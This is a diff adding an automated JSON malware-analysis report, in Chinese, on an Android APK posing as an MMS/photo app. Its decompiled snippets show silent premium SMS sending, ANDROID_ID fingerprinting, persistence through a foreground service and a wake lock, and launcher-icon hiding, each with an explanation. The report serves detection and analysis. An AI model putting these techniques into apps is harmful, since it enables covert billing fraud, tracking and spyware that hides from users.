@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "c0296448968626489547b97ac8445ef35d2734c803cc81b0841d80d5ddaf07ce.apk",
+    "sha256": "c0296448968626489547b97ac8445ef35d2734c803cc81b0841d80d5ddaf07ce",
+    "包名": "com.tolerate.formulate",
+    "应用名": "ММS - Фoто",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 243.0
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tolerate\\formulate\\a;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try {\n    Sale.a(true);\n    SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n} catch (Exception e) {\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Sale.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static void a(Context context, boolean z) {",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)由外部传入（通常来自C2服务器指令或硬编码的增值服务号码），整个过程无需用户确认、不弹出任何系统UI，属于典型的静默短信欺诈行为。异常被空catch块静默吞掉以规避崩溃和检测。结合同类的 setRepeating 定时任务（PeriodStem）周期性触发，以及厂商报告确认该样本伪装成'短信(Messages)'应用并滥用AccessibilityService，此行为可导致用户在不知情的情况下被订阅付费服务或向增值号码发送扣费短信，直接造成资费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tolerate\\formulate\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 9803) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 ContentResolver 中读取 ANDROID_ID（设备级唯一标识符），对受害设备进行指纹采集。数据流向：Settings.Secure 系统设置数据库（数据源）→ 返回 ANDROID_ID 字符串给调用方（危险操作），用于唯一标识和追踪感染设备。结合厂商报告确认该样本为伪装成短信应用、滥用 AccessibilityService 并隐藏自身以监视受害者的间谍软件，此指纹采集函数属于其情报收集环节，采集到的设备标识通常会与其他窃取数据一并用于受害者画像并回传 C2 服务器。同文件中还存在基于时间间隔（9803ms）静默拉起 Hypothesis 隐蔽组件的逻辑，进一步佐证该类为恶意功能类。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tolerate\\formulate\\Knot;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {\n    public void uncaughtException(Thread thread, Throwable th) {\n    }\n});\nif (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(b());\n} else {\n    startService(b());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Discuss\");\nthis.b.setReferenceCounted(false);\nthis.b.acquire();",
+          "malicious_code_snippet_context": "      @Override // android.app.Application\n      public void onCreate() {\n          super.onCreate();\n>>>         Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() { // from class: com.tolerate.formulate.Knot.2\n>>>             @Override // java.lang.Thread.UncaughtExceptionHandler\n>>>             public void uncaughtException(Thread thread, Throwable th) {\n>>>             }\n>>>         });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(b());\n>>>         } else {\n>>>             startService(b());\n>>>         }\n>>>         registerReceiver(new CurriculumFlat(), new IntentFilter(\"status\"));\n>>>         this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Discuss\");\n          this.b.setReferenceCounted(false);\n          this.b.acquire();\n          a.a(getApplicationContext(), System.currentTimeMillis());",
+          "behavior_description": "该代码位于恶意样本的 Application.onCreate 启动入口，构建了多重保活机制：1) 注册空的未捕获异常处理器，静默吞掉所有崩溃以防进程退出；2) 在 Android 8.0+ 通过 startForegroundService 启动前台服务绕过系统后台服务限制，实现服务常驻；3) 通过 PowerManager 获取 PARTIAL_WAKE_LOCK 唤醒锁，调用 setReferenceCounted(false) 且 acquire() 不设超时，长期持有唤醒锁使 CPU 持续唤醒、设备无法休眠。数据流向：系统服务 PowerManager.getSystemServive(\"power\") → newWakeLock(1).acquire() 无限期占用唤醒资源；应用启动 → startForegroundService(b()) 持久化后台服务。结合厂商报告（该样本伪装成短信应用，利用 AccessibilityService 窃取数据并隐藏自身进行监控），此保活机制确保间谍功能持续运行不被系统回收，属于恶意软件持久化基础设施的核心组成部分。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\tolerate\\formulate\\BearKoran;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) BearKoran.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class BearKoran extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) BearKoran.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate()中立即调用a()，通过PackageManager.setComponentEnabledSetting()将自身组件（BearKoran，即应用的Launcher入口Activity）设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED），随后调用finish()关闭界面。由于入口组件被禁用，应用图标会立即从桌面启动器中消失，用户难以察觉该应用的存在，也无法通过图标进入或卸载应用。数据流向：BearKoran.class（应用启动入口组件自身）→ setComponentEnabledSetting(禁用) → 应用图标隐藏。这与Zscaler报告中该样本伪装成'Messages'短信应用、利用AccessibilityService实施监控并'隐藏自身以窥探受害者'的描述完全吻合，是恶意软件实现隐蔽驻留、逃避用户检测与卸载的典型反检测手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
